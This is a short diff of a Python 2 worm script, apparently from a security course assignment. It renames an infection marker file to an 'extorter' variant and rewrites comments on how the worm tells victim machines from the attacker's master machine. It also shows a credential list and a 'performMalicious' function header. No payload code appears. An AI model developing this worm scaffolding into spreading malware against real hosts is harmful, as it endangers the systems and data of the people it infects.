@@ -29,7 +29,7 @@ credList = [
 ]
 
 # Marker file to indicate whether the machine/system has been infected.
-INFECTED_MARKER_FILE = "/tmp/.infected.txt"
+INFECTED_MARKER_FILE = "/tmp/.extorter_infected.txt"
 # Marker file to indicate this is the attacker system
 SELF_MARKER_FILE = "/tmp/.ilovecpsc456.txt"
 # Retrieve the full path of the running worm
@@ -454,7 +454,7 @@ def performMalicious():
 #===============================================================================
 if __name__ == "__main__":
 
-    # If the program run without an argument.  Then it's on a master
+    # If the program run with an argument, then it's on the victim machine
     if len(sys.argv) > 1:
         print "We are on the victim system"
 
@@ -469,8 +469,8 @@ if __name__ == "__main__":
             # Then mark the system as infected
             markSystemAsInfected(fromHost)
     else:
-        # If we are running with another argument, then first
-        # mark the system as master
+        # If we are running the worm without an argument, then it's
+        # on the master/attacker machine
         if not isLocalSystemInfected():
             markSystemAsMaster()
 
